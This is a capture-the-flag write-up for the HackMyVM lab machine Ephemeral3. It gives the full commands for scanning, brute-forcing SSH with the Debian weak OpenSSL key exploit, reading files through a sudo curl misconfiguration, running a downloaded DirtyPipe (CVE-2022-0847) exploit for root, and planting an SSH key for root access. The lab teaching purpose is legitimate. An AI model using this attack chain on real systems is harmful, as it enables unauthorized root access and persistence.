### Write up for https://hackmyvm.eu/machines/machine.php?vm=Ephemeral3 ###

## Walkthrough



```bash
sudo netdiscover -r 10.1.1.1/24 -i eth0
```

```bash
ip=10.1.1.24 
url=http://$ip
```

```bash
nmap -v -T5 -p- -sC -sV -oN nmap-$ip.log $ip; clear; cat nmap-$ip.log
```

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
```text
| ssh-hostkey: 
|   3072 f0:f2:b8:e0:da:41:9b:96:3b:b6:2b:98:95:4c:67:60 (RSA)
|   256 a8:cd:e7:a7:0e:ce:62:86:35:96:02:43:9e:3e:9a:80 (ECDSA)
|_  256 14:a7:57:a9:09:1a:7e:7e:ce:1e:91:f3:b1:1d:1b:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```bash
feroxbuster -e -x txt,php,html,zip,htm,bak -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u $url -t 500 -o ferox-$ip-full.log
```


```bash
curl $ip//note.txt
```

Hey! I just generated your keys with OpenSSL. You should be able to use your private key now! 

If you have any questions just email me at henry@ephemeral.com

##With little help from the creator of the machine, Thanks (Proxy) we need to find an exploit for openssl ssh keys.

```bash
searchsploit OpenSSL SSH
searchsploit -m 5720.py 
mv 5720.py exploit.py
```

after a quick reading of the exploit 
we need to:

```bash
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 
tar -xvf 5622.tar.bz2
```
python exploit.py ./rsa/2048/ 192.168.1.240 randy 22 5

```bash
ssh -l randy -p22 -i ./rsa/2048/0028ca6d22c68ed0a1e3f6f79573100a-31671 $ip 
```

```bash
sudo -l
```
```text
Matching Defaults entries for randy on ephemeral:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
```

```text
User randy may run the following commands on ephemeral:
    (henry) NOPASSWD: /usr/bin/curl
```

```bash
 https://gtfobins.github.io/gtfobins/curl/
```
 

```bash
randy@ephemeral:/home/henry$ LFILE=/home/henry/user.txt
randy@ephemeral:/home/henry$ sudo -u henry curl file://$LFILE
```
1st Flag

```bash
randy@ephemeral:/home/henry$ LFILE=/home/henry/.ssh/id_rsa
randy@ephemeral:/home/henry$ sudo -u henry curl file://$LFILE
curl: (37) Couldn't open file /home/henry/.ssh/id_rsa
```

also tried to write but same result.

lets try some enumeration.

after some enumarations and checking les report  we found out that our target is vulnerable to dirtypipe

```bash
cat les-report.txt 
```

Available information:

Kernel version: 5.13.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 20.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

79 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: [ ubuntu=(20.04|21.04) ],debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

lets use the dpipe checker to see if actually is vulnerable

```bash
wget https://raw.githubusercontent.com/basharkey/CVE-2022-0847-dirty-pipe-checker/main/dpipe.sh
```

upload this to /tmp

on our machine : python3 -m http.server 80
on target machine : cd /tmp && wget <ourip>/dpipe.sh
```bash
randy@ephemeral:~$ chmod +x dpipe.sh 
randy@ephemeral:~$ ./dpipe.sh 
```
5 13 0
Vulnerable

on our machine : git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git
./compile.sh
```bash
python3 -m http.server 80
```
on target machine :
```bash
randy@ephemeral:/tmp$ wget <ourip>/exploit && chmod +x exploit
randy@ephemeral:/tmp$ ./exploit 
```
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "aaron"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)
id
```text
uid=0(root) gid=0(root) groups=0(root)
```


```bash
cd /root/.ssh
ls (returned nothing)
cp /home/randy/.ssh/authorized_keys .
ls
```
authorized_keys
```bash
chmod 644 authorized_keys
```
exit
exit
```bash
randy@ephemeral:~$ cd ~/.ssh/
randy@ephemeral:~/.ssh$ ssh root@localhost -i id_rsa 
```
```text
root@ephemeral:~# ls
root.txt  snap
root@ephemeral:~# cat root.txt 
2nd Flag
```


PS I dont know if dp was the intented way.
